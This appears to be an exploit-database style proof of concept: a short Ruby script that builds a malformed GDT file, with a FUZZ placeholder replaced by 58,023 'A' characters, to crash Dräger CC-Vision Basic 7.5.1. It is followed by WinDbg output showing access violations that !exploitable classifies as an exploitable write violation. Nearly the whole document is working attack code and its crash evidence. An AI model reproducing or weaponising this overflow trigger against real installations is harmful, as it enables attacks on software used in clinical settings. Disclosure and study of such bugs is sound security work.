#!/usr/bin/env ruby
# CC-Vision Basic Version 7.5.1 (Build 009)
# https://static.draeger.com/www/files/CC-Vision-Basic-Setup.zip

data = 'A' * 58023

fd = File.open('sample.gdt', 'rb' )
new_gdt = fd.read(fd.stat.size)
fd.close

fuzz = new_gdt

x = File.new('poc.gdt','wb')
x.write(fuzz.gsub(/FUZZ/, data))
x.close
__END__
(cdc.4f4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=10ee0acc ebx=0b8c3260 ecx=00f8eb60 edx=003a0043 esi=0b8c3260 edi=00000111
eip=0040babc esp=0398f938 ebp=0398f9c9 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
ccvision+0xbabc:
0040babc 8b4af8          mov     ecx,dword ptr [edx-8] ds:002b:003a003b=????????
0:000> g
(cdc.4f4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00400000 ebx=004167a4 ecx=00000000 edx=00505a4d esi=0398f2d0 edi=00000000
eip=0040bab6 esp=0398d02c ebp=0398f2d5 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
ccvision+0xbab6:
0040bab6 c70000000000    mov     dword ptr [eax],0    ds:002b:00400000=00505a4d
0:000> !exploitable
Exploitability Classification: EXPLOITABLE
Recommended Bug Title: Exploitable - User Mode Write AV starting at ccvision+0x000000000000bab6 (Hash=0x07190a10.0x07190a6c)

User mode write access violations that are not near NULL are exploitable.

